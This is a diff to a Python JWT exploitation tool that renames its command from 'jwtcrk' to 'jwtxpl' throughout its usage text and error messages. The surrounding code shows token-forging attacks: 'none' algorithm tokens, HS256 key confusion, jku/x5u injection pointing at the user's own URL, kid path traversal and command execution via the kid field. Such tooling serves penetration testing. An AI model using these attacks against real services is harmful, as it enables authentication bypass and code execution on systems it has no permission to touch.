@@ -67,12 +67,12 @@ class Cracker:
 
     usage = """
         python3 jwt-crack.py <token> [OPTIONS]; OR
-        jwtcrk <token> [OPTIONS]; IF YOU HAVE USED install.py
+        jwtxpl <token> [OPTIONS]; IF YOU HAVE USED install.py
 	"""
 
     man = """
         python3 jwt-crack.py <token> [OPTIONS]; OR
-        jwtcrk <token> [OPTIONS]; IF YOU HAVE USED install.py
+        jwtxpl <token> [OPTIONS]; IF YOU HAVE USED install.py
 
         Positional:
         token                      [Your JWT.]
@@ -140,18 +140,18 @@ class Cracker:
            --generate-jwk          [Generate a jwk claim and insert it in the token header.]
 
         Examples:
-        jwtcrk <token> --decode
-        jwtcrk <token> --alg None --payload <key>:<value>
-        jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
-        jwtcrk <token> --alg hs256 --complex-payload <key1,key,2key3>:<value> --unverified
-        jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
-        jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
-        jwtcrk <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com
+        jwtxpl <token> --decode
+        jwtxpl <token> --alg None --payload <key>:<value>
+        jwtxpl <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
+        jwtxpl <token> --alg hs256 --complex-payload <key1,key,2key3>:<value> --unverified
+        jwtxpl <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
+        jwtxpl <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
+        jwtxpl <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com
 
         Documentation: Upcoming - Next Days
         """
 
-    command = ["jwtcrk"] + [sys.argv[i] for i in range(1, len(sys.argv))]
+    command = ["jwtxpl"] + [sys.argv[i] for i in range(1, len(sys.argv))]
 
     output = f"""{Bcolors.OKBLUE}A tool to exploit JWT vulnerabilities...{Bcolors.ENDC}
 {Bcolors.HEADER}Version:{Bcolors.ENDC} {Bcolors.OKCYAN}{__version__}{Bcolors.ENDC}
@@ -256,45 +256,45 @@ class Cracker:
         """Validate the token"""
         token_is_valid = Cracker.check_token(self.token)
         if not token_is_valid:
-            print("jwtcrk: err: Invalid token!")
+            print("jwtxpl: err: Invalid token!")
             sys.exit(2)
         """Validate alg"""
         if self.alg is not None:
             valid_algs = ["None", "none", "HS256", "hs256", "RS256", "rs256"]
             if self.alg not in valid_algs:
-                print(f"{Bcolors.FAIL}jwtcrk: err: Invalid algorithm{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: Invalid algorithm{Bcolors.ENDC}")
                 sys.exit(2)
             if self.alg == "hs256":
                 self.alg = "HS256"
             elif self.alg == "None" or self.alg == "none":
                 if any(self.require_alg_args):
-                    print(f"{Bcolors.FAIL}jwtcrk: err: You don't need a key with None/none algorithm{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: You don't need a key with None/none algorithm{Bcolors.ENDC}")
                     sys.exit(1)
                 print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
             elif self.alg == "rs256" or self.alg == "RS256":
                 if not any(arg for arg in self.jwks_args):
-                    print(f"{Bcolors.FAIL}jwtcrk: err: RS256 is supported only for jku injection for now{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: RS256 is supported only for jku injection for now{Bcolors.ENDC}")
                     sys.exit(1)
                 self.alg = "RS256"
         """Force self.alg to RS256 for jku attacks"""
         if any(arg for arg in self.jwks_args):
             if len(list(filter(lambda x: x is not None, self.jwks_args))) > 1:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You can't use two jku or x5u injections at the same time{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You can't use two jku or x5u injections at the same time{Bcolors.ENDC}")
                 sys.exit(1)
             if self.alg is not None and self.alg != "RS256":
-                print(f"{Bcolors.WARNING}jwtcrk: warn: With jku/x5u injections, alg will be forced to RS256{Bcolors.ENDC}")
+                print(f"{Bcolors.WARNING}jwtxpl: warn: With jku/x5u injections, alg will be forced to RS256{Bcolors.ENDC}")
             self.alg = "RS256"
         """--manual can be used only with jku-basic or x5u-basic"""
         if self.manual:
             if not self.jku_basic and not self.x5u_basic:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You can use --manual only with jku/x5u basic injections{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You can use --manual only with jku/x5u basic injections{Bcolors.ENDC}")
                 sys.exit(1)
         """Validate key"""
         if any(arg for arg in self.jwks_args):
             other_key_related_args = [self.path_to_key, self.auto_try, self.kid, self.exec_via_kid, self.specified_key]
             """With jku, you can't use other key related args"""
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You can't pass any key related arg with jku attacks{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You can't pass any key related arg with jku attacks{Bcolors.ENDC}")
                 sys.exit(2)
             if not self.x5u_basic and not self.x5u_header_injection:
                 """No x5u related argument has been passed"""
@@ -321,18 +321,18 @@ class Cracker:
         if self.auto_try is not None:
             other_key_related_args = [self.path_to_key, self.kid, self.exec_via_kid, self.specified_key]
             if any(arg is not None for arg in other_key_related_arg) or self.unverififed:
-                print(f"{Bcolors.FAIL}jwtcrk: err: --auto-try retrieves the key from ssl certs. Do not pass any other key related arg{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: --auto-try retrieves the key from ssl certs. Do not pass any other key related arg{Bcolors.ENDC}")
                 sys.exit(2)
             if self.exec_via_kid is not None:
-                print(f"{Bcolors.FAIL}jwtcrk: err: Code execution via kid needs no key. --autotry can't be ignored{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: Code execution via kid needs no key. --autotry can't be ignored{Bcolors.ENDC}")
             path = Cracker.get_key_from_ssl_cert(self.auto_try)
             self.path_to_key = path
         elif self.kid is not None:
             if self.exec_via_kid is not None:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You can't run two different kid injections at once{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You can't run two different kid injections at once{Bcolors.ENDC}")
                 sys.exit(2)
             if self.path_to_key is not None or self.specified_key is not None or self.unverified:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You don't need to specify a key for kid injections{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You don't need to specify a key for kid injections{Bcolors.ENDC}")
                 sys.exit(2)
             if self.kid.lower() == "dirtrv":
                 self.kid = "DirTrv"
@@ -345,20 +345,20 @@ class Cracker:
                 """Command will be executed before the server validates the signature"""
                 self.key = "itdoesnotmatter"
             else:
-                print(f"{Bcolors.FAIL}jwtcrk: err: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}")
                 sys.exit(2)
         elif self.exec_via_kid is not None:
             if self.path_to_key is not None or self.specified_key is not None:
-                print(f"{Bcolors.WARNING}jwtcrk: warn: Code execution via kid requires no key, your one will be ignored{Bcolors.ENDC}")
+                print(f"{Bcolors.WARNING}jwtxpl: warn: Code execution via kid requires no key, your one will be ignored{Bcolors.ENDC}")
             self.key = "itdoesnotmatter"
         elif self.specified_key is not None:
             if self.path_to_key is not None:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You have passed two keys with --specify and --key{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You have passed two keys with --specify and --key{Bcolors.ENDC}")
                 sys.exit(2)
             self.key = self.specified_key
         if self.path_to_key is not None:
             if not os.path.exists(self.path_to_key):
-                print(f"{Bcolors.FAIL}jwtcrk: err: Seems like the file does not exist{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: Seems like the file does not exist{Bcolors.ENDC}")
                 sys.exit(2)
             self.file = open(self.path_to_key, 'r')
             self.key = self.file.read()
@@ -381,7 +381,7 @@ class Cracker:
                       self.add_into, self.exec_via_kid,
         ]
         if any(arg is not None for arg in other_args) or self.unverified or self.manual or self.generate_jwk:
-            print(f"{Bcolors.WARNING}jwtcrk: warn: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}")
+            print(f"{Bcolors.WARNING}jwtxpl: warn: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}")
         print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
               "\n" +
               f"{Bcolors.HEADER}Payload:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_payload}{Bcolors.ENDC}"
@@ -415,51 +415,51 @@ class Cracker:
                     to_dict = item[0].split(":")[0]
                     to_add = item[0].split(":")[1]
                 except IndexError:
-                    print(f"{Bcolors.FAIL}jwtcrk: err: --add-into must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: --add-into must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
                     sys.exit(2)
                 if to_dict != "header" and to_dict != "payload":
-                    print(f"{Bcolors.FAIL}jwtcrk: err: You can delete keys only from header and payload{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: You can delete keys only from header and payload{Bcolors.ENDC}")
                     sys.exit(2)
                 if to_dict == "header":
                     header_dict = Cracker.add_key(header_dict, to_add)
                 elif to_dict == "payload":
-                    print(f"{Bcolors.WARNING}jwtcrk: warn: Adding key to payload is useless since you can do it directly via --payload{Bcolors.ENDC}")
+                    print(f"{Bcolors.WARNING}jwtxpl: warn: Adding key to payload is useless since you can do it directly via --payload{Bcolors.ENDC}")
                     payload_dict = Cracker.add_key(payload_dict, to_add)
         if self.kid:
             if "kid" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no kid{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no kid{Bcolors.ENDC}")
                 sys.exit(2)
             header_dict['kid'] += Cracker.inject_kid(self.kid)
         elif self.exec_via_kid:
             if "kid" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no kid{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no kid{Bcolors.ENDC}")
                 sys.exit(2)
             header_dict['kid'] += "|" + self.exec_via_kid
         elif self.jku_basic:
             if "jku" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no jku{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no jku{Bcolors.ENDC}")
                 sys.exit(2)
             if self.manual:
                 url = self.jku_basic
             else:
                 if self.jku_basic.endswith("jwks.json"):
-                    print(f"{Bcolors.FAIL}jwtcrk: err: '/.well-known/jwks.json' will automatically be appended to you url. If you need to specify the complete url use --manual{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: '/.well-known/jwks.json' will automatically be appended to you url. If you need to specify the complete url use --manual{Bcolors.ENDC}")
                     sys.exit(2)
                 url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = url
         elif self.jku_redirect:
             if "jku" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no jku{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no jku{Bcolors.ENDC}")
                 sys.exit(2)
             if "HERE" not in self.jku_redirect:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                 sys.exit(2)
             if "," not in self.jku_redirect:
-                print(f"{Bcolors.FAIL}jwtcrk: err: Missing url. Please pass the vulnerable url and your one as comma separated values{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: Missing url. Please pass the vulnerable url and your one as comma separated values{Bcolors.ENDC}")
                 sys.exit(2)
             if self.jku_redirect.endswith("jwks.json"):
-                print(f"{Bcolors.FAIL}jwtcrk: err: '/.well-known/jwks.json' will automatically be appended to your url. To craft an url by yourself, use --jku-basic with the --manual option{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: '/.well-known/jwks.json' will automatically be appended to your url. To craft an url by yourself, use --jku-basic with the --manual option{Bcolors.ENDC}")
                 sys.exit(2)
             main_url = self.jku_redirect.split(",")[0]
             your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
@@ -467,10 +467,10 @@ class Cracker:
             header_dict['jku'] = main_url.replace("HERE", your_url)
         elif self.jku_header_injection:
             if "jku" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no jku{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no jku{Bcolors.ENDC}")
                 sys.exit(2)
             if "HERE" not in self.jku_header_injection:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                 sys.exit(2)
             body = self.jku_via_header_injection(header_dict)
             content_length = len(body)
@@ -480,23 +480,23 @@ class Cracker:
             header_dict['jku'] = url
         elif self.x5u_basic:
             if "x5u" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no x5u{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no x5u{Bcolors.ENDC}")
                 sys.exit(2)
             if self.manual:
                 url = self.x5u_basic
             else:
                 if self.x5u_basic.endswith("jwks.json"):
-                    print(f"{Bcolors.FAIL}jwtcrk: err: '/.well-known/jwks.json' will automatically be appended to your url. If you need to specify the complete url please use --manual{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: '/.well-known/jwks.json' will automatically be appended to your url. If you need to specify the complete url please use --manual{Bcolors.ENDC}")
                     sys.exit(2)
                 url = self.x5u_basic.rstrip("/") + "/.well-known/jwks.json"
             self.x5u_basic_attack(header_dict)
             header_dict['x5u'] = url
         elif self.x5u_header_injection:
             if "x5u" not in header_dict.keys():
-                print(f"{Bcolors.FAIL}jwtcrk: err: JWT has no x5u header{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: JWT has no x5u header{Bcolors.ENDC}")
                 sys.exit(2)
             if "HERE" not in self.x5u_header_injection:
-                print(f"{Bcolors.FAIL}jwtcrk: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                 sys.exit(2)
             body = self.x5u_via_header_injection(header_dict)
             content_length = len(body)
@@ -519,13 +519,13 @@ class Cracker:
                     from_dict = item[0].split(":")[0]
                     to_del = item[0].split(":")[1]
                 except IndexError:
-                    print(f"{Bcolors.FAIL}jwtcrk: err: --remove-from must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: --remove-from must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
                     sys.exit(2)
                 if from_dict != "header" and from_dict != "payload":
-                    print(f"{Bcolors.FAIL}jwtcrk: err: You can delete keys only from header or payload{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: You can delete keys only from header or payload{Bcolors.ENDC}")
                     sys.exit(2)
                 if from_dict == "header" and to_del == "alg" or from_dict == "header" and to_del == "typ":
-                    print(f"{Bcolors.FAIL}jwtcrk: err: Deleting key {to_del} will invalidate the token{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: Deleting key {to_del} will invalidate the token{Bcolors.ENDC}")
                     sys.exit(1)
                 if from_dict == "header":
                     header_dict = Cracker.delete_key(header_dict, to_del)
@@ -681,7 +681,7 @@ class Cracker:
                 signature = ""
             elif self.alg == "HS256":
                 if self.key is None:
-                    print(f"{Bcolors.FAIL}jwtcrk: err: Key is needed with HS256{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with HS256{Bcolors.ENDC}")
                     sys.exit(2)
                 signature = base64.urlsafe_b64encode(
                     hmac.new(bytes(self.key, "utf-8"), partial_token.encode('utf-8'), hashlib.sha256).digest()
@@ -774,7 +774,7 @@ class Cracker:
                 return final_text
             except binascii.Error:
                 if i == 2:
-                    print(f"{Bcolors.FAIL}jwtcrk: err: Seems like the token is not base64 encoded or simply invalid{Bcolors.ENDC}")
+                    print(f"{Bcolors.FAIL}jwtxpl: err: Seems like the token is not base64 encoded or simply invalid{Bcolors.ENDC}")
                 encoded += b'='
                 i += 1
 
@@ -815,7 +815,7 @@ class Cracker:
             header_ = base64.urlsafe_b64decode(header_b64).decode('utf-8')
             payload_ = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
         except UnicodeDecodeError:
-            print(f"{Bcolors.FAIL}jwtcrk: err: Decoding Error. Please be sure to pass a valid jwt{Bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}jwtxpl: err: Decoding Error. Please be sure to pass a valid jwt{Bcolors.ENDC}")
             sys.exit(2)
         return header_, payload_
 
@@ -835,10 +835,10 @@ class Cracker:
             new_payload_key = new_payload[0]
             new_payload_value = Cracker.build_values(new_payload[1])
         except IndexError:
-            print(f"{Bcolors.FAIL}jwtcrk: err: Payload must have this syntax: name:value. You have written '{user_input}'{Bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}jwtxpl: err: Payload must have this syntax: name:value. You have written '{user_input}'{Bcolors.ENDC}")
             sys.exit(2)
         if new_payload_key not in iterable.keys():
-            print(f"{Bcolors.WARNING}jwtcrk: warn: can't find {new_payload_key} in the token payload. It will be added{Bcolors.ENDC}")
+            print(f"{Bcolors.WARNING}jwtxpl: warn: can't find {new_payload_key} in the token payload. It will be added{Bcolors.ENDC}")
         iterable[new_payload_key] = new_payload_value
         return iterable
 
@@ -871,7 +871,7 @@ class Cracker:
         :return: The modified dictonary
         """
         if key in iterable.keys():
-            print(f"{Bcolors.FAIL}jwtcrk: err: You are trying to add a key that already exists{Bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}jwtxpl: err: You are trying to add a key that already exists{Bcolors.ENDC}")
             sys.exit(2)
         iterable[key] = "default"
         return iterable
@@ -972,7 +972,7 @@ class Cracker:
                     keys_path = keys_path[key]
                 i += 1
             except (KeyError, TypeError):
-                print(f"{Bcolors.FAIL}jwtcrk: err: Key '{key}' is not present in payload{Bcolors.ENDC}")
+                print(f"{Bcolors.FAIL}jwtxpl: err: Key '{key}' is not present in payload{Bcolors.ENDC}")
                 sys.exit(2)
         return iterable
 
@@ -999,7 +999,7 @@ class Cracker:
             ).decode('utf-8')
         except subprocess.CalledProcessError:
             print(
-                f"{Bcolors.FAIL}jwtcrk: err: Can't openssl s_client can't connect with {hostname}. Please make sure to type correctly{Bcolors.ENDC}"
+                f"{Bcolors.FAIL}jwtxpl: err: Can't openssl s_client can't connect with {hostname}. Please make sure to type correctly{Bcolors.ENDC}"
             )
             sys.exit(2)
         cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
@@ -1012,7 +1012,7 @@ class Cracker:
             second_command, shell=True, stdin=devnull_, stderr=subprocess.STDOUT
         )
         if second_command_output:
-            print(f"{Bcolors.FAIL}jwtcrk: err: Maybe the cert is not valid{Bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}jwtxpl: err: Maybe the cert is not valid{Bcolors.ENDC}")
             sys.exit(2)
         key = f"{os.getcwd()}/key.pem"
         devnull_.close()
@@ -1061,7 +1061,7 @@ class Cracker:
         if self.decode:
             self.decode_and_quit()
         if self.alg is None:
-            print(f"{Bcolors.FAIL}jwtcrk: err: Missing --alg. You can mess it up only if you are decoding a jwt{Bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}jwtxpl: err: Missing --alg. You can mess it up only if you are decoding a jwt{Bcolors.ENDC}")
             sys.exit(2)
         header, payload = self.modify_header_and_payload()
         new_partial_token = Cracker.craft_token(header, payload)
